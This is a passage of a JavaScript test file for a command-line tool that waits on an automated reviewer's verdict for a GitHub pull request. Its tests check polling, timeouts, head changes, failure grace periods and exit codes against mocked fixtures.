  const r = await runWith(['--pr', '7', '--reviewer', 'chatgpt-codex-connector', '--json'], world({ reviews: [formalReview(H)] }));
  assert.equal(r.json.repo, 'acme/widgets');
  assert.deepEqual(r.calls[0].slice(0, 2), ['repo', 'view']);
});

test('the human output names the state, head, findings, threads and notices', async () => {
  const r = await runWith(['--pr', '7', '--reviewer', 'chatgpt-codex-connector', '--repo', 'acme/widgets'], world({
    issueComments: [quotaNotice(), summaryComment(COMPLETED, H)],
  }));
  assert.equal(r.code, 0);
  assert.match(r.stdout, /^State: reviewed$/m);
  assert.match(r.stdout, new RegExp(`^Head: ${H}`, 'm'));
  assert.match(r.stdout, /^Findings: 0/m);
  assert.match(r.stdout, /^Unresolved threads: 0/m);
  assert.match(r.stdout, /^Notices: 1/m);
});

const waitArgs = (...extra) => ['--pr', '7', '--reviewer', 'chatgpt-codex-connector', '--repo', 'acme/widgets', '--wait', '--json', ...extra];
// Full views only; each starts one collection. Confirming re-reads are not counted.
function prViews(calls) { return calls.filter((args) => args[0] === 'pr' && args[1] === 'view' && !isConfirmRead(args)).length; }

test('--wait returns when the state flips on the third poll, printing one line per change', async () => {
  const r = await runWith(waitArgs(), (poll) => (poll < 3
    ? world({ issueComments: [quotaNotice()] })
    : world({ issueComments: [quotaNotice(), summaryComment(COMPLETED, H)] })));
  assert.equal(r.code, 0);
  assert.equal(r.json.state, 'reviewed');
  assert.equal(prViews(r.calls), 3);
  assert.deepEqual(r.sleeps, [30000, 30000]);
  const progress = r.stderr.trim().split('\n');
  assert.equal(progress.length, 2, `one line per state change, not per poll:\n${r.stderr}`);
  assert.match(progress[0], /not-started/);
  assert.match(progress[1], /reviewed/);
});

test('--wait follows a head that changes mid-wait and never credits the old head', async () => {
  const r = await runWith(waitArgs(), (poll) => {
    if (poll === 1) return world({ issueComments: [summaryComment('👀 In progress', H)] });
    // The review of H lands after the push: it is evidence for H, not for NEW.
    const pr = { headRefOid: NEW, state: 'OPEN', isDraft: false, url: 'u' };
    if (poll === 2) return world({ pr, reviews: [formalReview(H)] });
    return world({ pr, reviews: [formalReview(H), formalReview(NEW)] });
  });
  assert.equal(r.code, 0);
  assert.equal(r.json.head, NEW);
  assert.equal(prViews(r.calls), 3);
  assert.match(r.stderr, /head changed/i);
  assert.match(r.stderr, new RegExp(NEW.slice(0, 7)));
  assert.deepEqual(r.json.headChanges.map((change) => change.to), [NEW]);
});

test('--wait times out with exit 4 and names the fallback', async () => {
  const running = world({ issueComments: [summaryComment('⏳ Queued', H)] });
  const r = await runWith(waitArgs('--timeout', '90', '--interval', '30'), running);
  assert.equal(r.code, 4);
  assert.equal(r.json.state, 'running');
  assert.equal(r.json.timedOut, true);
  assert.equal(r.sleeps.reduce((sum, ms) => sum + ms, 0), 90000, 'waits the full timeout and no longer');

  const human = await runWith(['--pr', '7', '--reviewer', 'chatgpt-codex-connector', '--repo', 'acme/widgets', '--wait', '--timeout', '60'], running);
  assert.equal(human.code, 4);
  assert.match(human.stdout, /No review of this head arrived; use the project's fallback reviewer/);
});

test('--wait stops with exit 5 when the pull request merges without a review of its head', async () => {
  const r = await runWith(waitArgs(), (poll) => (poll < 2
    ? world()
    : world({ pr: { headRefOid: H, state: 'MERGED', isDraft: false, url: 'u' } })));
  assert.equal(r.code, 5);
  assert.equal(r.json.prState, 'MERGED');
  assert.equal(prViews(r.calls), 2);
});

test('--wait stops with exit 3 when the review stays failed through the grace polls', async () => {
  const r = await runWith(waitArgs(), (poll) => world({ issueComments: [summaryComment(poll < 2 ? 'Running' : '❌ Failed', H)] }));
  assert.equal(r.code, 3);
  assert.equal(r.json.state, 'failed');
  assert.equal(prViews(r.calls), 4, 'the first failed read plus two grace polls');
  assert.match(r.stderr, /rechecking \(1 of 2\)/);

  // A deadline inside the grace still reports the failure, not a missing review.
  const human = await runWith(['--pr', '7', '--reviewer', 'chatgpt-codex-connector', '--repo', 'acme/widgets', '--wait', '--timeout', '30'], world({ issueComments: [summaryComment('❌ Failed', H)] }));
  assert.equal(human.code, 3);
  assert.doesNotMatch(human.stdout, /fallback reviewer/);
});

test('--wait outlasts the transient failed row Codex posts before a run starts', async () => {
  const r = await runWith(waitArgs(), (poll) => {
    if (poll === 1) return world({ issueComments: [summaryComment('❌ Failed', H)] });
    if (poll === 2) return world({ issueComments: [summaryComment('👀 In progress', H)] });
    return world({ issueComments: [summaryComment(COMPLETED, H)] });
  });
  assert.equal(r.code, 0);
  assert.equal(r.json.state, 'reviewed');
  assert.equal(prViews(r.calls), 3);

  // A head change restarts the grace: two failed reads on H and one on NEW are not final.
  const moved = await runWith(waitArgs(), (poll) => {
    if (poll <= 2) return world({ issueComments: [summaryComment('❌ Failed', H)] });
    const pr = { headRefOid: NEW, state: 'OPEN', isDraft: false, url: 'u' };
    return world({ pr, issueComments: [summaryComment(poll === 3 ? '❌ Failed' : COMPLETED, NEW)] });
  });
  assert.equal(moved.code, 0);
  assert.equal(moved.json.head, NEW);
});

test('a one-shot read reports failed at once', async () => {
  const r = await once(world({ issueComments: [summaryComment('❌ Failed', H)] }));
  assert.equal(r.code, 3);
  assert.equal(prViews(r.calls), 1);
});

test('--wait gives up with exit 1 after five consecutive gh failures, and tolerates fewer', async () => {
  const dead = await runWith(waitArgs(), 'fail');
  assert.equal(dead.code, 1);
  assert.equal(prViews(dead.calls), 5);
  assert.match(dead.stderr, /502/);

  const flaky = await runWith(waitArgs(), (poll) => (poll <= 4 ? 'fail' : world({ reviews: [formalReview(H)] })));
  assert.equal(flaky.code, 0);
  assert.equal(flaky.json.state, 'reviewed');

  // Failures must be consecutive: a good read in between resets the count.
  const patchy = await runWith(waitArgs(), (poll) => {
    if (poll === 10) return world({ reviews: [formalReview(H)] });
    return poll % 4 === 0 ? world() : 'fail';
  });
  assert.equal(patchy.code, 0);
});

test('--wait on an already reviewed head returns at once without sleeping', async () => {
  const r = await runWith(waitArgs(), world({ reviews: [formalReview(H)] }));
  assert.equal(r.code, 0);
  assert.deepEqual(r.sleeps, []);
});

test('a usage error exits 2 and a one-shot query error exits 1', async () => {
  assert.equal((await runWith(['--reviewer', 'x'], world())).code, 2);
  assert.equal((await runWith(['--pr', 'seven', '--reviewer', 'x'], world())).code, 2);
  assert.equal((await runWith(['--pr', '7'], world())).code, 2);
  assert.equal((await runWith(['--pr', '7', '--reviewer', 'x', '--bogus'], world())).code, 2);
  const failed = await runWith(['--pr', '7', '--reviewer', 'x', '--repo', 'acme/widgets'], 'fail');
  assert.equal(failed.code, 1);
  assert.match(failed.stderr, /502/);
});
